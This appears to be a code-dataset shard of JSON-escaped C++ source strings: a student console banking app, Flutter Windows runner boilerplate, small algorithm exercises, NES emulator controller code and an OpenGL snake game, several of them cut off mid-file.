 found = true;\n            break;\n        }\n    }\n\n    file.close();\n\n    if (found)\n    {\n        cout << \"\\n\\t\\tLogin successful\\n\";\n        star();\n        bm.run_bank();\n    }\n    else\n    {\n        cout << \"\\nError: Incorrect username, ID, or password\\n\";\n    }\n}\nvoid Bank::new_user()\n{\n\n    // system(\"cls\");\n    fstream file(\"userData.txt\", ios::in | ios::app | ios::out);\n    if (!file.is_open())\n    {\n        cerr << \"Error: Unable to open file userData.txt\\n\";\n        return;\n    }\n    cout << \"\\t\\t\\tAdd New User\\n\";\n    star();\n    cout << \"User name  \";\n\n    cin >> b.name;\n\n    cout << \"\\nUser ID  \";\n    cin >> b.id;\n\n    cout << \"\\nUser Password  \";\n    cin >> b.ps;\n\n    file << b.name << \" \" << b.id << \" \" << b.ps << \"\\n\";\n}\n/// //////////////////////// //////////////////////////////////////////////\nvoid B::deposit()\n{\n\n    int newblance;\n    cout << \"enter value\\n\";\n    cin >> newblance;\n    //  int* x=&newblance;\n    *balance += newblance;\n}\nvoid B::withdraw()\n{\n\n    int newblance;\n    while (true)\n    {\n\n        cout << \"enter value\\n\";\n        cin >> newblance;\n        // int *x=&newblance;\n        if (newblance > *balance)\n        {\n            cout << \"Eror your balance is less than value you want to withdraw\\n\";\n        }\n        else\n        {\n            *balance -= newblance;\n            break;\n        }\n    }\n}\nint *B::get()\n{\n\n    return balance;\n}\nvoid B::Payment()\n{\n    int u_id, B_amount,pas;\n    string B_name;\n    fstream file;\n    SYSTEMTIME X{};\n    cout << \"\\t\\tPayment Optine \\n\";\n    star();\n    cout << \"Enter Bill name \\n\";\n    cin >> B_name;\n    cout << \"Enter User iD \\n\";\n    c",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "\ufeff/*-----------------------------------------------------------------------------------------\n**\n** Copyright: Juliana, 2024~\n**\n** Filename: main.cpp\n**\n** Description: This File defines the entry of the application\n** \n** Including Function:\n**\t\tmain\n**\n** Design Annotation:\n**\n** Author:\n**\t\tJuliana, start writing this file in May 2024\n**\n** Modification History:\n**\t\tMay 2nd 2024, create this file\n**\t\t$Revision$\n**\t\t$Date$\n**\t\t$Author$\n**\t\t$Log$\n**\n**-----------------------------------------------------------------------------------------\n*/\n/*-----------------------------------------------------------------------------------------\n**\t\t\t\t\t\t\t\t\t\t  Include\n**-----------------------------------------------------------------------------------------\n*/\n#include \"twoSum.h\"\n\nusing namespace TwoSum;\n\n/*-----------------------------------------------------------------------------------------\n**\t\t\t\t\t\t\t\t\tFunction Definition\n**-----------------------------------------------------------------------------------------\n*/\n/*.BH--------------------------------------------------------------------------------------\n**\n** Function Name: main\n** \n** Description: This function defines the entry of the application\n** \n** Input Parameter:\n**\n** Output Parameter:\n**\n** Return Value:\n**\n** Design Annotation:\n** \n** Modification History:\n**\t\tMay 2nd 2024, create this function\n** \n**.EH--------------------------------------------------------------------------------------\n*/\nint main(void)\n{\n\tTwoSum::Solution::test();\n\n\treturn 0;\n}\n/* END of main */\n",
    "#include <iostream>\n#include <vector>\n\nusing namespace std;\n\nvoid dfs(int node, vector<bool>& visited, vector<vector<int>>& graph) {\n    visited[node] = true;\n    for (int neighbor : graph[node]) {\n        if (!visited[neighbor]) {\n            dfs(neighbor, visited, graph);\n        }\n    }\n}\n\nint countGroups(int N, vector<pair<int, int>>& bridges) {\n    vector<vector<int>> graph(N);\n    for (const auto& bridge : bridges) {\n        int u = bridge.first;\n        int v = bridge.second;\n        graph[u].push_back(v);\n        graph[v].push_back(u);\n    }\n\n    vector<bool> visited(N, false);\n    int groups = 0;\n    for (int i = 0; i < N; ++i) {\n        if (!visited[i]) {\n            dfs(i, visited, graph);\n            groups++;\n        }\n    }\n    return groups;\n}\n\nint main() {\n    int N, M;\n    cin >> N >> M;\n\n    vector<pair<int, int>> bridges(M);\n    for (int i = 0; i < M; ++i) {\n        cin >> bridges[i].first >> bridges[i].second;\n    }\n\n    int distinct_groups = countGroups(N, bridges);\n    cout << distinct_groups << endl;\n\n    return 0;\n}\n",
    "#include \"stdafx.h\"\n#include \"Nintendulator.h\"\n#include \"Settings.h\"\n#include \"resource.h\"\n#include \"Movie.h\"\n#include \"Controllers.h\"\n\nnamespace Controllers\n{\n#include <pshpack1.h>\nstruct ExpPort_Hori4Play_State\n{\n\tunsigned char BitPtr1;\n\tunsigned char BitPtr2;\n\tunsigned char Strobe;\n};\n#include <poppack.h>\nint\tExpPort_Hori4Play::Save (FILE *out)\n{\n\tint clen = 0;\n\tunsigned short len = sizeof(*State);\n\n\twriteWord(len);\n\twriteArray(State, len);\n\n\treturn clen;\n}\nint\tExpPort_Hori4Play::Load (FILE *in, int version_id)\n{\n\tint clen = 0;\n\tunsigned short len;\n\n\treadWord(len);\n\treadArraySkip(State, len, sizeof(*State));\n\n\treturn clen;\n}\nvoid\tExpPort_Hori4Play::Frame (unsigned char mode)\n{\n\tint x, y = 0;\n\tif (mode & MOV_PLAY)\n\t{\n\t\tfor (x = 0; x < FSPort1->MovLen; x++, y++)\n\t\t\tMovData[y] = FSPort1->MovData[x];\n\t\tfor (x = 0; x < FSPort2->MovLen; x++, y++)\n\t\t\tMovData[y] = FSPort2->MovData[x];\n\t\tfor (x = 0; x < FSPort3->MovLen; x++, y++)\n\t\t\tMovData[y] = FSPort3->MovData[x];\n\t\tfor (x = 0; x < FSPort4->MovLen; x++, y++)\n\t\t\tMovData[y] = FSPort4->MovData[x];\n\t}\n\tFSPort1->Frame(mode);\n\tFSPort2->Frame(mode);\n\tFSPort3->Frame(mode);\n\tFSPort4->Frame(mode);\n\tif (mode & MOV_RECORD)\n\t{\n\t\tfor (x = 0; x < FSPort1->MovLen; x++, y++)\n\t\t\tFSPort1->MovData[x] = MovData[y];\n\t\tfor (x = 0; x < FSPort2->MovLen; x++, y++)\n\t\t\tFSPort2->MovData[x] = MovData[y];\n\t\tfor (x = 0; x < FSPort3->MovLen; x++, y++)\n\t\t\tFSPort3->MovData[x] = MovData[y];\n\t\tfor (x = 0; x < FSPort4->MovLen; x++, y++)\n\t\t\tFSPort4->MovData[x] = MovData[y];\n\t}\n}\nunsigned char\tExpPort_Hori4Play::Read1 (void)\n{\n\tunsigned char result = 0;\n\tif (State->Strobe)\n\t\tState->BitPtr1 = 0;\n\tswitch (State->BitPtr1)\n\t{\n\tcase  0:case  1:case  2:case  3:case  4:case  5:case  6:case  7:\n\t\tresult = FSPort1->Read() <<1;\n\t\tbreak;\n\tcase  8:case  9:case 10:case 11:case 12:case 13:case 14:case 15:\n\t\tresult = FSPort3->Read() <<1;\n\t\tbreak;\n\tcase 18:\n\t\tresult = 2;\n\t\tbreak;\n\t}\n\tif (State->BitPtr1 == 24)\n\t\tresult = 2;\n\telse\tState->BitPtr1++;\n\treturn result;\n}\nunsigned char\tExpPort_Hori4Play::Read2 (void)\n{\n\tunsigned char result = 0;\n\tif (State->Strobe)\n\t\tState->BitPtr2 = 0;\n\tswitch (State->BitPtr2)\n\t{\n\tcase  0:case  1:case  2:case  3:case  4:case  5:case  6:case  7:\n\t\tresult = FSPort2->Read() <<1;\n\t\tbreak;\n\tcase  8:case  9:case 10:case 11:case 12:case 13:case 14:case 15:\n\t\tresult = FSPort4->Read() <<1;\n\t\tbreak;\n\tcase 19:\n\t\tresult = 2;\n\t\tbreak;\n\t}\n\tif (State->BitPtr2 == 24)\n\t\tresult = 2;\n\telse\tState->BitPtr2++;\n\treturn result;\n}\n\nunsigned char\tExpPort_Hori4Play::ReadIOP (uint8_t) {\n\treturn 0;\n}\n\nvoid\tExpPort_Hori4Play::Write (unsigned char Val)\n{\n\tif ((State->Strobe) || (Val & 1))\n\t{\n\t\tState->Strobe = Val & 1;\n\t\tState->BitPtr1 = 0;\n\t\tState->BitPtr2 = 0;\n\t\tFSPort1->Write(Val);\n\t\tFSPort2->Write(Val);\n\t\tFSPort3->Write(Val);\n\t\tFSPort4->Write(Val);\t\t\n\t}\n}\nINT_PTR\tCALLBACK\tExpPort_Hori4Play_ConfigProc (HWND hDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)\n{\n\tint wmId, wmEvent;\n\tswitch (uMsg)\n\t{\n\tcase WM_INITDIALOG:\n\t\tSendDlgItemMessage(hDlg, IDC_CONT_SPORT1, CB_RESETCONTENT, 0, 0);\n\t\tSendDlgItemMessage(hDlg, IDC_CONT_SPORT2, CB_RESETCONTENT, 0, 0);\n\t\tSendDlgItemMessage(hDlg, IDC_CONT_SPORT3, CB_RESETCONTENT, 0, 0);\n\t\tSendDlgItemMessage(hDlg, IDC_CONT_SPORT4, CB_RESETCONTENT, 0, 0);\n\t\tSendDlgItemMessage(hDlg, IDC_CONT_SPORT1, CB_ADDSTRING, 0, (LPARAM)StdPort_Mappings[STD_UNCONNECTED]);\n\t\tSendDlgItemMessage(hDlg, IDC_CONT_SPORT2, CB_ADDSTRING, 0, (LPARAM)StdPort_Mappings[STD_UNCONNECTED]);\n\t\tSendDlgItemMessage(hDlg, IDC_CONT_SPORT3, CB_ADDSTRING, 0, (LPARAM)StdPort_Mappings[STD_UNCONNECTED]);\n\t\tSendDlgItemMessage(hDlg, IDC_CONT_SPORT4, CB_ADDSTRING, 0, (LPARAM)StdPort_Mappings[STD_UNCONNECTED]);\n\t\tSendDlgItemMessage(hDlg, IDC_CONT_SPORT1, CB_ADDSTRING, 0, (LPARAM)StdPort_Mappings[STD_STDCONTROLLER]);\n\t\tSendDlgItemMessage(hDlg, IDC_CONT_SPORT2, CB_ADDSTRING, 0, (LPARAM)StdPort_Mappings[STD_STDCONTROLLER]);\n\t\tSendDlgItemMessage(hDlg, IDC_CONT_SPORT3, CB_ADDSTRING, 0, (LPARAM)StdPort_Mappings[STD_STDCONTROLLER]);\n\t\tSendDlgItemMessage(hDlg, IDC_CONT_SPORT4, CB_ADDSTRING, 0, (LPARAM)StdPort_Mappings[STD_STDCONTROLLER]);\n\t\tSendDlgItemMessage(hDlg, IDC_CONT_SPORT1, CB_SETCURSEL, FSPort1->Type, 0);\n\t\tSendDlgItemMessage(hDlg, IDC_CONT_SPORT2, CB_SETCURSEL, FSPort2->Type, 0);\n\t\tSendDlgItemMessage(hDlg, IDC_CONT_SPORT3, CB_SETCURSEL, FSPort3->Type, 0);\n\t\tSendDlgItemMessage(hDlg, IDC_CONT_SPORT4, CB_SETCURSEL, FSPort4->Type, 0);\n\t\tif (Movie::Mode)\n\t\t{\n\t\t\tEnableWindow(GetDlgItem(hDlg, IDC_CONT_SPORT1), FALSE);\n\t\t\tEnableWindow(GetDlgItem(hDlg, IDC_CONT_SPORT2), FALSE);\n\t\t\tEnableWindow(GetDlgItem(hDlg, IDC_CONT_SPORT3), FALSE);\n\t\t\tEnableWindow(GetDlgItem(hDlg, IDC_CONT_SPORT4), FALSE);\n\t\t}\n\t\telse\n\t\t{\n\t\t\tEnableWindow(GetDlgItem(hDlg, IDC_CONT_SPORT1), TRUE);\n\t\t\tEnableWindow(GetDlgItem(hDlg, IDC_CONT_SPORT2), TRUE);\n\t\t\tEnableWindow(GetDlgItem(hDlg, IDC_CONT_SPORT3), TRUE);\n\t\t\tEnableWindow(GetDlgItem(hDlg, IDC_CONT_SPORT4), TRUE);\n\t\t}\n\t\treturn TRUE;\n\tcase WM_COMMAND:\n\t\twmId    = LOWORD(wParam); \n\t\twmEvent = HIWORD(wParam); \n\t\tswitch (wmId)",
    "#include <iostream>\n#include <ctime>\nclass Trees\n{\npublic:\n    int topBranch = 0;\n    int middleBranch = 0;\n    std::string name = \"Unknow\";\n    \n    void setNumberMiddleBranch(int &inMiddleBranch)\n    {\n        middleBranch = inMiddleBranch;\n    }\n\n    int getMiddleBranch()\n    {\n        return middleBranch;\n    }\n};\n\nclass ElvenVillage: public Trees\n{\nprivate:\n    \n   \n    Trees** branches = nullptr;\n\npublic:\n    ElvenVillage()\n    {\n        topBranch = rand() % 3 + 3;       \n       \n        branches = new Trees*[topBranch];\n        for (int i = 0; i < topBranch; ++i)\n        {\n            middleBranch = rand() % 2 + 2;\n            branches[i] = new Trees[middleBranch];\n            branches[i]->setNumberMiddleBranch(middleBranch);\n        }\n    }\n\n    void setName()\n    {\n        for (int i = 0; i < topBranch; ++i)\n        {\n            for (int j = 0; j < branches[i]->getMiddleBranch(); ++j)\n            {\n                std::cout << \"Enter the elf's name: \";\n                //std::cin >> branches[i][j].name;\n                if (i == 0 && j==0)\n                {\n                    branches[i][j].name = \"elf\";\n                }\n                else if (i == 0)\n                {\n                    branches[i][j].name = \"None\";\n                }\n                else\n                {\n                    branches[i][j].name = 'a' + i + j;\n                }\n                \n                \n            }\n        }        \n    }\n\n    void printName()\n    {\n        for (int i = 0; i < topBranch; ++i)\n        {\n            for (int j = 0; j < branches[i]->getMiddleBranch(); ++j)\n            {\n                std::cout << \"Elf's name: \" << branches[i][j].name << std::endl;\n            }\n        }\n    }\n\n    void searchName(std::string & elvenName)\n    {\n        for (int i = 0; i < topBranch; ++i)\n        {\n            for (int j = 0; j < branches[i]->getMiddleBranch(); ++j)\n            {\n                if (elvenName == branches[i][j].name) \n                {                    \n                    for (int k = 0; k < branches[i]->getMiddleBranch(); ++k)\n                    {\n                        if (branches[i][k].name != \"None\")\n                        {\n                            std::cout << \"Elf's name: \" << branches[i][k].name << std::endl;\n                        }\n                    }\n                    break;\n                }                \n            }\n        }\n    }\n};\n\nint main()\n{\n    srand(time(NULL));\n    int trees = 2;\n    std::string elvenName;\n    \n    ElvenVillage* elvenVillage = new ElvenVillage[trees];\n\n    for (int i = 0; i < trees; ++i)\n    {\n        elvenVillage[i].setName();\n    }\n\n    std::cout << std::endl;\n\n    for (int i = 0; i < trees; ++i)\n    {\n        elvenVillage[i].printName();\n    }\n    std::cout << \"Enter the name of the elf you want to find: \";\n    std::cin >> elvenName;\n\n    for (int i = 0; i < trees; ++i)\n    {\n        elvenVillage[i].searchName(elvenName);\n    }\n\n    delete[] elvenVillage;\n    return 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"todoapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"openGLPart.h\"\n\n\nPoint bunnyLocation[50];\nPoint snakeBody[MAX_SEGMENTS];// circular array to implemenet the queue of body segments...\nint bodySegments;\nint firstIndex;//shows the tail position\nint width, height;\nPoint snakeUp = { 0,0,1 };\n//lastIndex = (firstIndex + bodySegments) % MAX_SEGMENTS;//shows the head position\n//lastIndex = (firstIndex + bodySegments - 1) % MAX_SEGMENTS;//shows the starting point of line segment which ends at the head\nGLfloat randomColors[300000];\nint lats = 30, longs = 200;\nbool moving = false, gameover = false;\nint blinking = BLINKING_PERIOD;\nint tongue = 0;\nbool defaultCamera = true;\nint eaten = 0;\ndouble bunnyRotDegree = 0;\nconst int font = (int)GLUT_BITMAP_TIMES_ROMAN_24;//GLUT_BITMAP_9_BY_15;\nstd::vector<GLfloat> vertices;\nstd::vector<GLuint> faces;\nstd::vector<GLfloat> normals;\n\nColorPattern bunnyColor = DEFAULT_BUNNY_COLOR;\nint bunnyCount = DEFAULT_NUMBER_OF_BUNNIES;\ndouble bunnySize = DEFAULT_BUNNY_SIZE;\n\nColorPattern snakeColor = DEFAULT_SNAKE_COLOR;\ndouble snakeSpeed = DEFAULT_SPEED;\ndouble snakeSize = DEFAULT_THICKNESS;\n\nint t = 0;\n\nfloat x = 0.0, y = 0.0, scaleFactor = 1, rotateX = 0, rotateY = 0, rotateZ = 0;\nfloat deltaXMove = 0.0, deltaYMove = 0.0; // initially camera doesn't move\n\ntypedef GLint vertex3[3];\nvertex3 pt[8] = { {-1, -1, -1}, {-1, 1, -1}, {1, -1, -1}, {1, 1, -1},\n{-1, -1, 1}, {-1, 1, 1}, {1, -1, 1}, {1, 1, 1} };\n\nvoid quad(GLint n1, GLint n2, GLint n3, GLint n4, double depth)\n{\n    glBegin(GL_QUADS);\n    glVertex3f(pt[n1][0], pt[n1][1], (pt[n1][2] + 1) * depth / 2 - 1);\n    glVertex3f(pt[n2][0], pt[n2][1], (pt[n2][2] + 1) * depth / 2 - 1);\n    glVertex3f(pt[n3][0], pt[n3][1], (pt[n3][2] + 1) * depth / 2 - 1);\n    glVertex3f(pt[n4][0], pt[n4][1], (pt[n4][2] + 1) * depth / 2 - 1);\n    glEnd();\n}\nvoid cube(double depth)\n{\n    glColor4f(0.6, 0.6, 0.6, .5);\n    glNormal3f(0, 0, -1);\n    quad(2, 0, 1, 3, depth);//FLOOR, Z=0\n    glColor4f(0.0, 1.0, 1.0, 0.5);\n    glNormal3f(-1, 0, 0);\n    quad(5, 1, 0, 4, depth);//X=0\n    glColor4f(0.0, 0.0, 1.0, 0.5);//BLUE\n    glNormal3f(0, 1, 0);\n    quad(7, 3, 1, 5, depth);//Y=100\n    glColor4f(1.0, 1.0, 0.0, 0.5);\n    glNormal3f(0, -1, 0);\n    quad(4, 0, 2, 6, depth);//Y=0\n    glColor4f(1.0, 0.0, 1.0, .5);//GREEN\n    glNormal3f(1, 0, 0);\n    quad(6, 2, 3, 7, depth);//X=100\n}\nvoid renderBitmapString(float x, float y, void* font, const char* string) {\n    const char* c;\n    glRasterPos2f(x, y);\n    for (c = string; *c != '\\0'; c++) {\n        glutBitmapCharacter(font, *c);\n    }\n}\nPoint diff(Point p2, Point  p1) {\n    Point result = { p2.x - p1.x, p2.y - p1.y, p2.z - p1.z };\n    return result;\n}\ndouble euclideanDistanceSquare(Point p1, Point p2) {\n    return (p1.x - p2.x) * (p1.x - p2.x) + (p1.y - p2.y) * (p1.y - p2.y) + (p1.z - p2.z) * (p1.z - p2.z);\n}\nvoid initGame() {\n    srand(time(NULL));\n    for (int i = 0; i < 300000; i++)\n        randomColors[i] = (double)rand() / RAND_MAX;\n    for (int i = 0; i < 50; i++)\n        bunnyLocation[i] = randomBunnyLocation(2, 2, FIELD_DEPTH, i, i);\n    firstIndex = 0;\n    bodySegments = 1;\n    snakeBody[0] = { 0,0,INITIAL_Z };\n    snakeBody[1] = { INITIAL_LENGTH, 0, INITIAL_Z };\n}\n/* ******************************************************* */\n/* ******************************************************* */\n/* *******************INITIALIZATION********************** */\n/* ******************************************************* */\n/* ******************************************************* */\nstatic void init(void)\n{\n    glClearColor(1, 1, 1, 1);\n    //glMatrixMode(GL_PROJECTION);\n    //glLoadIdentity();\n    //glOrtho(-1, 1, -1, 1, DNEAR, 2*EYE_Z);\n    glMatrixMode(GL_MODELVIEW);\n    glLoadIdentity();\n    gluLookAt(0.0f, 0.0f, EYE_Z, //< eye position\n        0.0f, 0.0f, 0.0f,  //< aim position\n        0.0f, 1.f, 0.0f); //< up direction\n    glEnable(GL_BLEND);\n    glBlendFunc(GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA);\n    glEnable(GL_DEPTH_TEST);\n    //glDepthFunc(GL_LESS);//GL_GREATER, GL_ALWAYS, GL_NEVER\n\n\n    GLfloat mat_specular[] = { 0.0, 1.0, 0.0,1 };\n    GLfloat mat_specularback[] = { 1.0, 0.0, 0.0, 0.0 };\n    GLfloat mat_shininess[] = { .2 };\n    GLfloat mat_shininessback[] = { .5 };\n    GLfloat light_position0[] = { -1, -1.0, 1.0, 0 };\n    GLfloat light_position1[] = { 0.5, 0.5, 0.5, 0 };\n    GLfloat ambient[] = { 1,1, 1, 0 };\n    glShadeModel(GL_SMOOTH);\n\n    glMaterialfv(GL_FRONT, GL_SPECULAR, mat_specular);\n    glMaterialfv(GL_FRONT, GL_SHININESS, mat_shininess);\n    glMaterialfv(GL_BACK, GL_SPECULAR, mat_specularback);\n    glMaterialfv(GL_BACK, GL_SHININESS, mat_shininessback);\n    glLightfv(GL_LIGHT0, GL_POSITION, light_position0);\n    glLightfv(GL_LIGHT1, GL_POSITION, light_position1);\n    glLightfv(GL_LIGHT1, GL_DIFFUSE, ambient);\n    //glEnable(GL_LIGHTING);\n    glEnable(GL_LIGHT0);\n    glEnable(GL_LIGHT1);\n\n\n\n    glEnable(GL_FOG);\n    glFogi(GL_FOG_MODE, GL_EXP);\n    glFogf(GL_FOG_START, DNEAR);\n    glFogf(GL_FOG_END, EYE_Z);\n    //glFogf(GL_FOG_COLOR, .8);\n    glFogf(GL_F",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"sms_email_flutter_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
